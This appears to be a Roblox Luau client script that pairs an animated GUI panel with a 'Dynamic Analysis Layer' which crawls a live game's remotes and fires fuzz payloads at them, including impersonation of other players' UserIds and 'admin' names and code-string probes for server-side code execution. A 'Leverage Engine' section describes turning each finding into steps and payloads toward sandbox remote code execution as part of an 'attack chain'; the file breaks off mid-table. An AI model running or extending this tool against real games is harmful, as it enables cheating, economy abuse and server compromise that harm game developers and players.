        task.delay(0.15, refreshLayout)
        tw(ContentArea, T.TW_MED, { BackgroundTransparency = T.ALPHA_SURFACE })
        tw(TabBar,      T.TW_MED, { BackgroundTransparency = 1 })
        for i, b in ipairs(tabBtns) do
            local isActive = (i == activeTab)
            tw(b, T.TW_MED, {
                BackgroundTransparency = isActive and T.ALPHA_TAB_ACT  or T.ALPHA_TAB_IDLE,
                TextTransparency       = 0,
                BackgroundColor3       = isActive and T.COL_TAB_ACTIVE or T.COL_TAB_IDLE,
                TextColor3             = isActive and T.COL_TEXT_PRI   or T.COL_TEXT_SEC,
            })
        end
        tw(Grip, T.TW_MED, { BackgroundTransparency = T.ALPHA_GRIP })
    end
end

-- OPEN ANIMATION
local function playOpenAnimation()
    Panel.BackgroundTransparency       = 1
    panelStroke.Transparency           = 1
    TitleLabel.TextTransparency        = 1
    ContentArea.BackgroundTransparency = 1
    for _, b in ipairs(tabBtns) do
        b.BackgroundTransparency = 1
        b.TextTransparency       = 1
    end
    Grip.BackgroundTransparency = 1

    local startW = math.floor(panW * 0.60)
    local startH = math.floor(panH * 0.60)
    PanelShell.Size     = UDim2.fromOffset(startW, startH)
    PanelShell.Position = UDim2.fromOffset(
        panX + math.floor((panW - startW) / 2),
        panY + math.floor((panH - startH) / 2))
    Panel.Size     = UDim2.fromOffset(startW, startH)
    Panel.Position = UDim2.fromOffset(0, 0)

    tw(PanelShell, T.TW_OPEN_SIZE, { Size = UDim2.fromOffset(panW, panH), Position = UDim2.fromOffset(panX, panY) })
    tw(Panel,      T.TW_OPEN_SIZE, { Size = UDim2.fromOffset(panW, panH) })

    task.delay(0.06, function()
        tw(Panel,       T.TW_OPEN_FADE, { BackgroundTransparency = T.ALPHA_PANEL })
        tw(panelStroke, T.TW_OPEN_FADE, { Transparency           = T.ALPHA_BORDER })
    end)
    task.delay(0.16, function()
        tw(TitleLabel, T.TW_OPEN_FADE, { TextTransparency = 0 })
        tw(Grip,       T.TW_OPEN_FADE, { BackgroundTransparency = T.ALPHA_GRIP })
    end)
    for i, b in ipairs(tabBtns) do
        local isActive = (i == activeTab)
        task.delay(0.22 + (i-1) * 0.055, function()
            tw(b, T.TW_OPEN_FADE, {
                BackgroundTransparency = isActive and T.ALPHA_TAB_ACT or T.ALPHA_TAB_IDLE,
                TextTransparency       = 0,
            })
        end)
    end
    task.delay(0.30, function()
        tw(ContentArea, T.TW_OPEN_FADE, { BackgroundTransparency = T.ALPHA_SURFACE })
        task.delay(0.06, refreshLayout)
    end)
end

-- CLOSE ANIMATION
local function playCloseAnimation()
    state = State.CLOSED

    tw(TitleLabel,  T.TW_CLOSE_FDE, { TextTransparency = 1 })
    tw(ContentArea, T.TW_CLOSE_FDE, { BackgroundTransparency = 1 })
    tw(Grip,        T.TW_CLOSE_FDE, { BackgroundTransparency = 1 })
    for _, b in ipairs(tabBtns) do
        tw(b, T.TW_CLOSE_FDE, { BackgroundTransparency = 1, TextTransparency = 1 })
    end

    local sqW = math.floor(panW * 1.04)
    local sqH = math.floor(panH * 0.88)
    local sqX = panX - math.floor((sqW - panW) / 2)
    local sqY = panY + math.floor((panH - sqH) / 2)

    tw(PanelShell, T.TW_CLOSE_SQH, { Size = UDim2.fromOffset(sqW, sqH), Position = UDim2.fromOffset(sqX, sqY) })
    tw(Panel,      T.TW_CLOSE_SQH, { Size = UDim2.fromOffset(sqW, sqH), BackgroundTransparency = T.ALPHA_PANEL * 0.5 })

    task.delay(0.11, function()
        local endX = panX + math.floor(panW / 2)
        local endY = panY + math.floor(panH / 2)
        tw(PanelShell, T.TW_CLOSE_SHK, { Size = UDim2.fromOffset(0, 0), Position = UDim2.fromOffset(endX, endY) })
        tw(Panel,      T.TW_CLOSE_SHK, { Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1 })
        tw(panelStroke,T.TW_CLOSE_SHK, { Transparency = 1 })
        task.delay(0.26, function() ScreenGui:Destroy() end)
    end)
end

-- BUTTON WIRING
CloseBtn.MouseButton1Click:Connect(function()
    if state ~= State.CLOSED then playCloseAnimation() end
end)

MinBtn.MouseButton1Click:Connect(function()
    if state == State.OPEN      then setState(State.MINIMIZED)
    elseif state == State.MINIMIZED then setState(State.OPEN) end
end)

do
    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local now = tick()
            if (now - RCE.lastClickT) < 0.28 and state ~= State.CLOSED then
                if state == State.OPEN then setState(State.MINIMIZED)
                else setState(State.OPEN) end
            end
            RCE.lastClickT = now
        end
    end)
end

-- RUN
playOpenAnimation()

-- ====================================================================
--   DYNAMIC ANALYSIS LAYER  (merged module)
--   Everything below is the DAL -- fuzzer, EBD, ingress mapper, race
--   scanner, and the 4-tab UI panel. It shares this script's Players,
--   TweenService, and LocalPlayer references declared at the top.
-- ====================================================================

--[[
  +======================================================================+
  |   DAL.lua  --  Dynamic Analysis Layer  v1.0                         |
  |   Part of: TransparentGui Security Tool                            |
  |                                                                    |
  |   Architecture: Three-tier sphere model                            |
  |     Tier 1 -- Static Graph Layer  (existing S->S tool)               |
  |     Tier 2 -- Dynamic Analysis Layer  (THIS FILE)                   |
  |     Tier 3 -- DALSink  (cross-session anomaly memory)               |
  |                                                                    |
  |   Two operating modes:                                             |
  |     MODE 1  Logical Hunter   -- challenges developer assumptions     |
  |     MODE 2  RCE Probe        -- hunts the data->instruction boundary |
  |                                                                    |
  |   Sub-systems:                                                     |
  |     Crawler    -- runtime remote discovery, periodic re-scan        |
  |     Tagger     -- trace IDs, identity fingerprinting                |
  |     Fuzzer     -- adaptive payload mutation (4 phases)              |
  |     Snapshot   -- differential state analysis (before / after)      |
  |     Registry   -- violation logging, severity scoring               |
  |     EBD        -- Execution Boundary Detector (Mode 2)              |
  |     Ingress    -- double-ingress / fleet-broadcast mapper           |
  |     DALSink    -- persistent anomaly sink                           |
  |     UI         -- integrated panel (4 tabs)                         |
  |                                                                    |
  |   Drop into StarterPlayerScripts as a LocalScript, OR             |
  |   append directly after the existing TransparentGui_fixed.lua      |
  |                                                                    |
  |   Roblox Lua 5.1 compatible -- no external dependencies            |
  +======================================================================+
--]]

-- ==================================================================
--   SERVICES
--   Players, TweenService, LocalPlayer already declared near the top
--   of the merged script. Only RunService is new here.
-- ==================================================================
-- ==================================================================
--   REGISTER-LIMIT FIX: the main chunk (this whole script) is itself
--   one Luau function, capped at 200 local registers. The original
--   tool already used a large share of that budget before DAL was
--   ever appended, so DAL's ~20+ additional top-level locals (SEV,
--   VTYPE, MUTATIONS, DALSink, COL, mkFrame, mkLabel, buildPanel,
--   etc.) pushed the main chunk over the limit.
--
--   Fix: wrap the entire DAL definition in an IIFE (a genuine nested
--   function). A real function boundary gets its OWN independent
--   200-register budget, completely separate from the main chunk's.
--   Only the single returned DAL table costs the main chunk a
--   register, instead of every internal helper and local DAL uses.
-- ==================================================================
local DAL = (function()
local RunService = game:GetService("RunService")

-- ==================================================================
--   SEVERITY LEVELS
-- ==================================================================
local SEV = {
    INFO     = { label = "INFO",     score = 1, col = Color3.fromRGB(110, 125, 165) },
    LOW      = { label = "LOW",      score = 2, col = Color3.fromRGB( 90, 180, 255) },
    MEDIUM   = { label = "MEDIUM",   score = 3, col = Color3.fromRGB(220, 175,  50) },
    HIGH     = { label = "HIGH",     score = 4, col = Color3.fromRGB(220, 120,  50) },
    CRITICAL = { label = "CRITICAL", score = 5, col = Color3.fromRGB(228,  60,  80) },
    RCE      = { label = "SB-RCE",   score = 6, col = Color3.fromRGB(200,  40, 220) },
}

-- ==================================================================
--   VIOLATION TYPES
-- ==================================================================
local VTYPE = {
    LOGIC_BYPASS     = "Logic Bypass",
    STATE_SPOOF      = "State Spoofing",
    IDENTITY_LOSS    = "Identity Loss",
    BROADCAST_POISON = "Broadcast Poisoning",
    SILENT_PROCESS   = "Silent Processing",
    RACE_PRECOND     = "Race Precondition",
    DOUBLE_INGRESS   = "Double Ingress",
    RCE_BOUNDARY     = "SB-RCE Boundary",
}

-- ==================================================================
--   MUTATION LIBRARY
--   Each entry: { label = string, payload = any }
--   Organised into phases matching the four vulnerability classes
-- ==================================================================
local MUTATIONS = {}

-- Phase 1 -- Type Confusion  (Vulnerability class 1: Serialization Trap)
MUTATIONS.TYPE_CONFUSION = {
    { label = "NaN",            payload = 0/0            },
    { label = "Infinity",       payload = math.huge       },
    { label = "Neg-Infinity",   payload = -math.huge      },
    { label = "Zero",           payload = 0               },
    { label = "Negative",       payload = -1              },
    { label = "Overflow",       payload = 2^53            },
    { label = "Empty String",   payload = ""              },
    { label = "Boolean True",   payload = true            },
    { label = "Boolean False",  payload = false           },
    { label = "Empty Table",    payload = {}              },
    { label = "Nil-key Table",  payload = { [false] = 1 } },
}

-- Phase 2 -- Deep Nesting  (stress-tests recursive handlers)
local function buildNested(depth)
    if depth <= 0 then return { probe = "DEEP_TERMINAL" } end
    return { n = buildNested(depth - 1) }
end
MUTATIONS.DEEP_NEST = {
    { label = "Depth-5",  payload = buildNested(5)  },
    { label = "Depth-15", payload = buildNested(15) },
    { label = "Depth-50", payload = buildNested(50) },
}

-- Phase 3 -- Identity Substitution  (Vulnerability class B: Identity Loss)
--   Built at runtime so it captures current server population
local function buildIdentityMutations()
    local out = {
        { label = "UserId:1",       payload = 1         },  -- Roblox admin account
        { label = "Name:Roblox",    payload = "Roblox"  },
        { label = "UserId:-1",      payload = -1        },
        { label = "UserId:0",       payload = 0         },
        { label = "Name:admin",     payload = "admin"   },
        { label = "Name:AdminUser", payload = "AdminUser"},
    }
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(out, { label = "UserId:"..p.UserId, payload = p.UserId })
            table.insert(out, { label = "Name:"..p.Name,    payload = p.Name    })
        end
    end
    return out
end

-- Phase 4 -- RCE Environment Probes  (Mode 2 only -- non-destructive)
--   These are read-only environment checks. They do not execute, alter,
--   or destroy anything. If the server echoes any result back, that
--   confirms the string was treated as an instruction -- the ledge.
MUTATIONS.RCE_PROBES = {
    { label = "loadstring-check", payload = "tostring(type(loadstring))"    },
    { label = "getfenv-check",    payload = "tostring(type(getfenv))"       },
    { label = "getgc-check",      payload = "tostring(type(getgc))"         },
    { label = "require-check",    payload = "tostring(type(require))"       },
    { label = "env-PlaceId",      payload = "tostring(game.PlaceId)"        },
    { label = "ls-sentinel",      payload = "LS_PROBE_7f3a"                 },
    { label = "code-table",       payload = { __code = "return game.PlaceId", __type = "probe" } },
}

-- ==================================================================
--   DALSink SINK  --  Tier 3: persistent cross-session anomaly memory
-- ==================================================================
local DALSink = {
    log     = {},
    MAX_LOG = 500,
    onEntry = nil,   -- UI callback, set by panel builder
}

function DALSink:push(entry)
    entry.ts = tick()
    table.insert(self.log, 1, entry)
    if #self.log > self.MAX_LOG then table.remove(self.log) end
    if self.onEntry then self.onEntry(entry) end
end

function DALSink:clear()
    self.log = {}
    if self.onEntry then self.onEntry(nil) end
end

-- ==================================================================
--   DAL  --  Tier 2: Dynamic Analysis Layer
-- ==================================================================
local DAL = {
    -- Discovered remotes:  path -> record
    discovered   = {},
    -- Active probes:       traceId -> probe
    activeProbes = {},
    -- Violation log (newest first)
    violations   = {},

    -- Config
    MAX_VIOLATIONS = 200,
    PROBE_TIMEOUT  = 5.0,    -- seconds before silent-processing verdict
    CRAWL_INTERVAL = 15.0,   -- seconds between background re-crawls
    FUZZ_RATE      = 0.25,   -- seconds between individual probe fires

    -- Operating mode
    mode = 1,   -- 1 = Logical Hunter | 2 = RCE Probe

    -- UI callbacks (wired up by panel builder)
    onViolation = nil,
    onDiscovery = nil,
}

-- -- Trace ID generator --------------------------------------------
local _traceSeq = 0
local function newTraceId(suffix)
    _traceSeq = _traceSeq + 1
    return string.format("TR-%04d-%s", _traceSeq, (suffix or "???"):sub(-6))
end

-- ==================================================================
--   VIOLATION REGISTRY
-- ==================================================================
function DAL:logViolation(vtype, severity, remotePath, payload, evidence, traceId)
    local v = {
        id         = string.format("V%04d", #self.violations + 1),
        timestamp  = tick(),
        vtype      = vtype,
        severity   = severity,
        remotePath = remotePath  or "unknown",
        payload    = tostring(payload):sub(1, 100),
        evidence   = evidence    or "No evidence recorded",
        traceId    = traceId     or "--",
        mode       = self.mode,
    }
    table.insert(self.violations, 1, v)
    if #self.violations > self.MAX_VIOLATIONS then
        table.remove(self.violations)
    end

    -- Push to DALSink sink
    DALSink:push({
        type     = "VIOLATION",
        vtype    = v.vtype,
        sev      = v.severity.label,
        path     = v.remotePath,
        payload  = v.payload,
        evidence = v.evidence,
        traceId  = v.traceId,
    })

    if self.onViolation then self.onViolation(v) end
    return v
end

function DAL:clearViolations()
    self.violations = {}
    if self.onViolation then self.onViolation(nil) end
end

-- ==================================================================
--   STATE SNAPSHOT  --  Differential State Analysis
--   Captures every observable client-side value before a probe fires,
--   then diffs it after the server responds. Any unexpected change in
--   an unrelated value flags a Lateral Transport Trust hole.
-- ==================================================================
local function captureSnapshot()
    local snap = { ts = tick(), values = {} }

    -- Leaderstats
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v:IsA("ValueBase") then
                snap.values["ls:" .. v.Name] = tostring(v.Value)
            end
        end
    end

    -- Character humanoid properties
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            snap.values["hum:Health"]    = tostring(hum.Health)
            snap.values["hum:WalkSpeed"] = tostring(hum.WalkSpeed)
            snap.values["hum:JumpPower"] = tostring(hum.JumpPower)
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            local pos = root.Position
            snap.values["pos:X"] = tostring(math.floor(pos.X))
            snap.values["pos:Y"] = tostring(math.floor(pos.Y))
            snap.values["pos:Z"] = tostring(math.floor(pos.Z))
        end
    end

    -- Player instance attributes
    for k, v in pairs(LocalPlayer:GetAttributes()) do
        snap.values["attr:" .. tostring(k)] = tostring(v)
    end

    return snap
end

local function diffSnapshots(before, after)
    local diffs = {}
    -- Changed / removed keys
    for k, vBefore in pairs(before.values) do
        local vAfter = after.values[k]
        if vAfter ~= vBefore then
            table.insert(diffs, { key=k, before=vBefore, after=(vAfter or "nil") })
        end
    end
    -- New keys that appeared
    for k, vAfter in pairs(after.values) do
        if before.values[k] == nil then
            table.insert(diffs, { key=k, before="nil", after=vAfter })
        end
    end
    return diffs
end

local function diffToString(diffs)
    local parts = {}
    for _, d in ipairs(diffs) do
        table.insert(parts, d.key .. ": " .. d.before .. " -> " .. d.after)
    end
    return table.concat(parts, " | ")
end

-- ==================================================================
--   SERVER RESPONSE HANDLER
--   Attached as OnClientEvent listener on every discovered remote.
--   Receives whatever the server fires back and runs three checks:
--     1. RCE execution signature detection  (Mode 2)
--     2. Differential state analysis
--     3. Marks the active probe as resolved (stops silent-proc timer)
-- ==================================================================

-- RCE execution signatures -- strings the server should NEVER echo
-- back unless it tried to execute the probe as code
local RCE_SIGNATURES = {
    "LS_PROBE_7f3a",     -- our sentinel string
    "function:",         -- Lua function tostring
    "table: 0x",         -- raw table address
    "getfenv",
    "getgc",
    "loadstring",
}

local function containsRCESig(val)
    local s = tostring(val):lower()
    for _, sig in ipairs(RCE_SIGNATURES) do
        if s:find(sig:lower(), 1, true) then return sig end
    end
    return nil
end

function DAL:_onServerResponse(remotePath, ...)
    local args = { ... }

    -- Walk active probes looking for any that are targeting this remote
    for traceId, probe in pairs(self.activeProbes) do
        if probe.remotePath == remotePath then
            probe.responseReceived = true
            probe.responseArgs     = args
            probe.responseTs       = tick()

            -- -- Check 1: RCE signature scan (Mode 2) -------------
            if self.mode == 2 and probe.isRCEProbe then
                for _, arg in ipairs(args) do
                    local sig = containsRCESig(arg)
                    if sig then
                        self:logViolation(
                            VTYPE.RCE_BOUNDARY, SEV.RCE,
                            remotePath,
                            probe.payload,
                            "Server echoed execution signature '" .. sig ..
                            "' -- probe string treated as instruction. LEDGE CONFIRMED.",
                            traceId
                        )
                    end
                end
            end

            -- -- Check 2: Differential state (after 300ms settle) -
            if probe.snapshotBefore and probe.isMutation then
                task.delay(0.30, function()
                    local snapAfter = captureSnapshot()
                    local diffs     = diffSnapshots(probe.snapshotBefore, snapAfter)
                    if #diffs > 0 then
                        local sev = #diffs >= 3 and SEV.CRITICAL or SEV.HIGH
                        self:logViolation(
                            VTYPE.STATE_SPOOF, sev,
                            remotePath,
                            probe.payload,
                            "Malformed payload mutated server state: " ..
                            diffToString(diffs):sub(1, 160),
                            traceId
                        )
                    end
                end)
            end
        end
    end
end

-- ==================================================================
--   REMOTE CRAWLER
--   Recursively walks ReplicatedStorage, ReplicatedFirst, Workspace.
--   Attaches an OnClientEvent listener to every RemoteEvent found.
--   Safe: uses pcall on restricted containers.
--   Re-runs every CRAWL_INTERVAL seconds to catch dynamic additions.
-- ==================================================================
local function getRemotePath(inst)
    local parts = { inst.Name }
    local p = inst.Parent
    while p and p ~= game do
        table.insert(parts, 1, p.Name)
        p = p.Parent
    end
    return table.concat(parts, ".")
end

local CRAWL_ROOTS = {
    function() return game:GetService("ReplicatedStorage") end,
    function() return game:GetService("ReplicatedFirst")   end,
    function() return workspace                            end,
}

function DAL:crawl()
    local newCount = 0

    local function scan(parent)
        local ok, children = pcall(function() return parent:GetChildren() end)
        if not ok then return end

        for _, child in ipairs(children) do
            local isRemote =
                child:IsA("RemoteEvent") or
                child:IsA("RemoteFunction")

            if isRemote then
                local path = getRemotePath(child)
                if not self.discovered[path] then
                    local rec = {
                        inst       = child,
                        path       = path,
                        kind       = child.ClassName,
                        probeCount = 0,
                        firstSeen  = tick(),
                        listener   = nil,
                    }

                    -- Attach response listener (RemoteEvent only)
                    if child:IsA("RemoteEvent") then
                        rec.listener = child.OnClientEvent:Connect(function(...)
                            self:_onServerResponse(path, ...)
                        end)
                    end

                    self.discovered[path] = rec
                    newCount = newCount + 1

                    DALSink:push({
                        type = "DISCOVERY",
                        path = path,
                        kind = child.ClassName,
                    })

                    if self.onDiscovery then
                        self.onDiscovery(path, child)
                    end
                end
            end

            -- Recurse
            pcall(scan, child)
        end
    end

    for _, rootFn in ipairs(CRAWL_ROOTS) do
        local ok, root = pcall(rootFn)
        if ok then pcall(scan, root) end
    end

    return newCount
end

function DAL:startCrawlLoop()
    task.spawn(function()
        while true do
            self:crawl()
            task.wait(self.CRAWL_INTERVAL)
        end
    end)
end

-- ==================================================================
--   PROBE FIRE
--   Core method -- fires one payload at one remote, manages the
--   trace ID, snapshot, timeout, and silent-processing verdict.
-- ==================================================================
function DAL:fireProbe(remotePath, payload, meta)
    local rec = self.discovered[remotePath]
    if not rec then return nil end

    meta = meta or {}
    local traceId = newTraceId(remotePath)
    local snap    = captureSnapshot()

    self.activeProbes[traceId] = {
        remotePath       = remotePath,
        payload          = payload,
        isMutation       = meta.isMutation       or false,
        isIdentityProbe  = meta.isIdentityProbe  or false,
        isRCEProbe       = meta.isRCEProbe        or false,
        snapshotBefore   = snap,
        firedTs          = tick(),
        responseReceived = false,
        responseArgs     = nil,
    }

    -- Fire the remote
    local fireOk, fireErr = pcall(function()
        if rec.inst:IsA("RemoteEvent") then
            rec.inst:FireServer(payload)
        elseif rec.inst:IsA("RemoteFunction") then
            task.spawn(function()
                local ok2, result = pcall(function()
                    return rec.inst:InvokeServer(payload)
                end)
                if ok2 and self.activeProbes[traceId] then
                    self.activeProbes[traceId].responseReceived = true
                    self.activeProbes[traceId].responseArgs     = { result }
                    self:_onServerResponse(remotePath, result)
                end
            end)
        end
        rec.probeCount = rec.probeCount + 1
    end)

    if not fireOk then
        -- Client-side error on fire (useful: tells us the remote exists
        -- but something in the local invoke path failed)
        self:logViolation(
            VTYPE.LOGIC_BYPASS, SEV.INFO,
            remotePath, payload,
            "Client-side FireServer error: " .. tostring(fireErr),
            traceId
        )
    end

    -- Timeout watchdog -- no response = silent processing
    task.delay(self.PROBE_TIMEOUT, function()
        local probe = self.activeProbes[traceId]
        if probe and not probe.responseReceived and probe.isMutation then
            self:logViolation(
                VTYPE.SILENT_PROCESS, SEV.MEDIUM,
                remotePath, payload,
                string.format(
                    "Server did not respond within %.1fs after malformed payload. " ..
                    "Silent processing suspected -- server consumed bad data without rejecting it.",
                    self.PROBE_TIMEOUT
                ),
                traceId
            )
        end
        self.activeProbes[traceId] = nil
    end)

    return traceId
end

-- ==================================================================
--   ADAPTIVE FUZZER
--   Runs four phases against a single remote.
--   Phase 1 -- Type Confusion
--   Phase 2 -- Deep Nesting
--   Phase 3 -- Identity Substitution
--   Phase 4 -- RCE Probes  (Mode 2 only)
--   Plus two context probes: nil arg, multi-arg overflow
-- ==================================================================
function DAL:fuzzRemote(remotePath, onProgress, onComplete)
    local rec = self.discovered[remotePath]
    if not rec then
        if onComplete then onComplete(0) end
        return
    end

    task.spawn(function()
        local total = 0

        local function fire(mutation, meta)
            self:fireProbe(remotePath, mutation.payload, meta)
            total = total + 1
            if onProgress then onProgress(mutation.label, total) end
            task.wait(self.FUZZ_RATE)
        end

        -- Phase 1
        if onProgress then onProgress("> Phase 1: Type Confusion", total) end
        for _, m in ipairs(MUTATIONS.TYPE_CONFUSION) do
            fire(m, { isMutation = true })
        end

        -- Phase 2
        if onProgress then onProgress("> Phase 2: Deep Nesting", total) end
        for _, m in ipairs(MUTATIONS.DEEP_NEST) do
            fire(m, { isMutation = true })
        end

        -- Phase 3 (build fresh -- captures current server population)
        if onProgress then onProgress("> Phase 3: Identity Substitution", total) end
        for _, m in ipairs(buildIdentityMutations()) do
            fire(m, { isMutation = true, isIdentityProbe = true })
        end

        -- Phase 4 (Mode 2 only)
        if self.mode == 2 then
            if onProgress then onProgress("> Phase 4: RCE Boundary Probes", total) end
            for _, m in ipairs(MUTATIONS.RCE_PROBES) do
                fire(m, { isMutation = true, isRCEProbe = true })
            end
        end

        -- Context probe: nil argument
        self:fireProbe(remotePath, nil, { isMutation = true })
        total = total + 1
        task.wait(self.FUZZ_RATE)

        -- Context probe: multi-argument overflow
        local r2 = self.discovered[remotePath]
        if r2 and r2.inst:IsA("RemoteEvent") then
            pcall(function()
                r2.inst:FireServer(math.huge, "PROBE", {x=true}, false, nil, -1)
            end)
            total = total + 1
        end

        -- Wait for timeout watchdogs to resolve
        task.wait(self.PROBE_TIMEOUT + 0.5)
        if onComplete then onComplete(total) end
    end)
end

-- Fuzz every discovered remote sequentially
function DAL:fuzzAll(onProgress, onComplete)
    local paths = {}
    for path in pairs(self.discovered) do
        table.insert(paths, path)
    end
    local idx = 0
    local function next()
        idx = idx + 1
        if idx > #paths then
            if onComplete then onComplete() end
            return
        end
        local path = paths[idx]
        if onProgress then
            onProgress(string.format("[%d/%d] %s", idx, #paths, path))
        end
        self:fuzzRemote(path, nil, next)
    end
    next()
end

-- ==================================================================
--   EXECUTION BOUNDARY DETECTOR  (EBD)
--   Mode 2 sub-system.
--   Step 1: Static name scoring -- does the remote name contain
--           keywords associated with execution sinks?
--   Step 2: RCE probe battery -- fires environment-check strings
--           and watches for execution signatures in the response.
-- ==================================================================
local EBD_SINK_KEYWORDS = {
    "eval", "exec", "run", "load", "interpret", "compile",
    "execute", "invoke", "dispatch", "process", "handle",
    "script", "code", "command", "cmd", "perform", "call",
}

local function scoreRemoteName(name)
    local lower = name:lower()
    local score = 0
    for _, kw in ipairs(EBD_SINK_KEYWORDS) do
        if lower:find(kw, 1, true) then
            score = score + 2
        end
    end
    return score
end

function DAL:probeRCEBoundary(remotePath, onResult)
    if self.mode ~= 2 then
        if onResult then onResult(false, "Switch to MODE 2 first") end
        return
    end
    local rec = self.discovered[remotePath]
    if not rec then
        if onResult then onResult(false, "Remote not in discovered set") end
        return
    end

    -- Static name analysis
    local nameScore = scoreRemoteName(rec.inst.Name)
    if nameScore > 0 then
        self:logViolation(
            VTYPE.RCE_BOUNDARY, SEV.MEDIUM,
            remotePath,
            "static:name-analysis",
            string.format(
                "Remote name '%s' matches %d execution-sink keyword(s). " ..
                "Static risk score: %d. Proceed with dynamic probing.",
                rec.inst.Name, nameScore, nameScore
            ),
            "EBD-STATIC"
        )
    end

    -- Dynamic probe battery
    task.spawn(function()
        for _, m in ipairs(MUTATIONS.RCE_PROBES) do
            self:fireProbe(remotePath, m.payload, { isRCEProbe = true, isMutation = true })
            task.wait(self.FUZZ_RATE)
        end
        task.wait(self.PROBE_TIMEOUT + 0.5)
        if onResult then onResult(true, "RCE probe complete") end
    end)
end

-- ==================================================================
--   DOUBLE INGRESS MAPPER
--   Finds the structural precondition for Fleet-Wide Broadcast Poisoning.
--   Cannot read server scripts, so uses name-pattern matching to flag
--   remotes that are architecturally likely to touch MessagingService.
--   A structural match IS the finding -- you don't need to detonate it.
-- ==================================================================
local INGRESS_PATTERNS = {
    "broadcast", "fleet", "global", "crossserver", "cross_server",
    "publish",   "message", "announce", "notify", "alert",
    "sync",      "replicate", "propagate", "distribute",
}

function DAL:mapDoubleIngress()
    local flagged = {}
    for path, rec in pairs(self.discovered) do
        local lower = rec.inst.Name:lower()
        for _, pattern in ipairs(INGRESS_PATTERNS) do
            if lower:find(pattern, 1, true) then
                table.insert(flagged, { path = path, pattern = pattern })
                self:logViolation(
                    VTYPE.DOUBLE_INGRESS, SEV.HIGH,
                    path,
                    "static:ingress-map",
                    string.format(
                        "Remote '%s' matches fleet-broadcast pattern '%s'. " ..
                        "If this remote feeds MessagingService:PublishAsync, " ..
                        "a poisoned payload will be replicated to the entire server fleet.",
                        rec.inst.Name, pattern
                    ),
                    "DI-MAP"
                )
                break
            end
        end
    end
    return flagged
end

-- ==================================================================
--   RACE CONDITION PRECONDITION DETECTOR
--   Looks for structural absence of debounce/mutex on high-value remotes.
--   Uses name heuristics (economy, state-change verbs) to flag candidates.
-- ==================================================================
local RACE_HIGH_VALUE = {
    "buy", "purchase", "sell", "trade", "transfer",
    "redeem", "claim", "collect", "upgrade", "equip",
    "spend", "withdraw", "deposit", "coin", "gold", "cash",
    "currency", "points", "xp", "level",
}

function DAL:scanRacePreconditions()
    local flagged = {}
    for path, rec in pairs(self.discovered) do
        local lower = rec.inst.Name:lower()
        for _, kw in ipairs(RACE_HIGH_VALUE) do
            if lower:find(kw, 1, true) then
                table.insert(flagged, { path = path, keyword = kw })
                self:logViolation(
                    VTYPE.RACE_PRECOND, SEV.MEDIUM,
                    path,
                    "static:race-scan",
                    string.format(
                        "Remote '%s' contains economy keyword '%s'. " ..
                        "Verify server-side debounce or mutex is present. " ..
                        "Without one, rapid-fire calls may pass concurrent balance checks.",
                        rec.inst.Name, kw
                    ),
                    "RACE-SCAN"
                )
                break
            end
        end
    end
    return flagged
end

-- ==================================================================
--   LEVERAGE ENGINE
--
--   Purpose: turn a raw violation into an actionable roadmap toward
--   SB-RCE. When DAL finds something, it doesn't stop at "this is
--   broken." It asks: what does this broken thing actually unlock?
--   What's the next concrete step from this specific finding toward
--   obtaining Sandbox Remote Code Execution?
--
--   Architecture:
--     1. STATIC PRE-SCANNER   -- reads each remote before touching it.
--                               Scores name patterns against known
--                               execution-sink keywords, identity-drop
--                               patterns, and broadcast-ingress markers.
--                               This is the "direct way to find bugs"
--                               without blind fuzzing.
--
--     2. LEVERAGE RESOLVER    -- given a violation type + remote context,
--                               produces a structured LeveragePlan:
--                               { step, technique, payload, nodeType,
--                                 rceProximity, rationale }
--
--     3. LEVERAGE LOG         -- ordered list of plans (newest first),
--                               surfaced in the LEVERAGE tab of the UI.
--
--     4. APPLY TO NODE        -- pushes a LeveragePlan into the S->S
--                               graph as a real node so the finding
--                               becomes part of the attack chain.
-- ==================================================================

-- -- RCE Proximity scale -------------------------------------------
-- How many confirmed steps away from SB-RCE is this finding?
-- 1 = direct execution boundary confirmed
-- 2 = one hop away (e.g. identity loss into an exec-capable system)
-- 3 = structural precondition only (race, ingress map)
local RCE_PROX = {
    DIRECT      = 1,
    ONE_HOP     = 2,
    STRUCTURAL  = 3,
}

-- -- Leverage Plan schema ------------------------------------------
-- Every plan produced by the engine has this shape:
-- {
--   id          : string           unique plan ID
--   timestamp   : number
--   remotePath  : string
--   vtype       : VTYPE.*
--   severity    : SEV.*
--   rceProximity: RCE_PROX.*      (1=closest, 3=structural)
--   technique   : string           one-line technique name
--   rationale   : string           why this works / what it proves
--   steps       : { string, ... }  ordered action steps for the user
--   payload     : string           concrete payload string to try next
--   nodeType    : string           node type to add to S->S graph
--   nodeLabel   : string           label for that node
--   applied     : boolean          has user applied this to their graph?
-- }

local LE = {
    plans    = {},
    MAX_PLANS = 100,
    onPlan   = nil,   -- UI callback
}

local _planSeq = 0
local function newPlanId()
    _planSeq = _planSeq + 1
    return string.format("LP-%04d", _planSeq)
end

-- -- Static Pre-Scanner -------------------------------------------
-- Scores a remote before any fuzzing happens. Returns a pre-scan
-- record with risk signals that guide which probes to run first.

local PRE_SCAN_EXEC_SINKS = {
    -- Direct execution sinks (highest priority)
    { kw="loadstring",  weight=10, signal="loadstring-sink"   },
    { kw="require",     weight=8,  signal="require-sink"      },
    { kw="getfenv",     weight=9,  signal="getfenv-sink"      },
    { kw="exec",        weight=7,  signal="exec-pattern"      },
    { kw="eval",        weight=7,  signal="eval-pattern"      },
    { kw="run",         weight=5,  signal="run-pattern"       },
    { kw="compile",     weight=6,  signal="compile-pattern"   },
    { kw="interpret",   weight=6,  signal="interpret-pattern" },
    { kw="script",      weight=5,  signal="script-pattern"    },
    -- Identity / trust boundary
    { kw="admin",       weight=8,  signal="admin-boundary"    },
    { kw="auth",        weight=7,  signal="auth-boundary"     },
    { kw="verify",      weight=6,  signal="verify-boundary"   },
    { kw="trust",       weight=6,  signal="trust-boundary"    },
    { kw="permission",  weight=5,  signal="permission-boundary"},
    { kw="rank",        weight=5,  signal="rank-boundary"     },
    -- Economy / state change
    { kw="buy",         weight=4,  signal="economy-state"     },
